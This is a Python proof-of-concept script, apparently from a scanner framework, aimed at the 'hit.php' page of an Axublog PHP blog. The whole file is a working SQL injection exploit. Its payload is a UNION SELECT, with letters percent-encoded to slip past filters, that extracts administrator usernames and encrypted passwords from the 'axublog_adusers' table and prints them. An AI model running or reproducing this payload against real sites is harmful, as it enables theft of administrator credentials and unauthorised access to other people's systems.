import re

from requests import Request, Session

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("hit.php"):
            print("[*] Please make sure the url end with 'hit.php'")
            exit()
        s = Session()
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        payload = "?g=arthit&id=0+uni%6fn+s%65l%65ct+1,1,1,1,1,1,group_concat(id,0x3c62723e,adnaa,0x3c62723e,adpss,0x3c62723e),1,1,1,1,1+fro%6d+axublog_adusers"
        url = target.url + payload
        req = Request('GET', url)
        prepped = s.prepare_request(req)
        prepped.url = prepped.url.replace('o', '%6f')
        prepped.url = prepped.url.replace('e', '%65')
        resp = s.send(prepped)
        p = re.compile("(?<=document.write\(1<br>)(.*)(?=<br>\);)")
        result = re.search(p, resp.text).group(0).split('<br>')
        print("[*] Get the username : " + result[0])
        print("[*] Get the password(encrypted) : " + result[1])
    except (KeyError, AttributeError) as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
